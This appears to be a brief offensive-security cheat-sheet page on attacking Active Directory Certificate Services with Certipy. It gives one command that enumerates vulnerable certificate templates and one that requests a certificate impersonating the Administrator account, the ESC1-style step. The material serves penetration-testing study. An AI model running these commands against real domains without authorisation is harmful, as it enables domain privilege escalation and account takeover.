# ADCS

## <mark style="color:yellow;">Certipy</mark>

### <mark style="color:blue;">Enumerate CA & Misconfigs</mark>

```bash
certipy find -u amogus@{DOMAIN} -p password -vulnerable -stdout -debug
```

### <mark style="color:blue;">Requesting a certificate</mark>

```bash
certipy req -k -no-pass -ca amgs-DC-CA -upn Administrator -target {DOMAIN}
```

> ADCS has a lot of misconfigs, from ESC1 to ESC13. I will add them here as long I would use it on practice at least once&#x20;

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://docs.google.com/spreadsheets/d/1E5SDC5cwXWz36rPP_TXhhAvTvqz2RGnMYXieu4ZHx64/edit?pli=1&gid=0#gid=0" %}
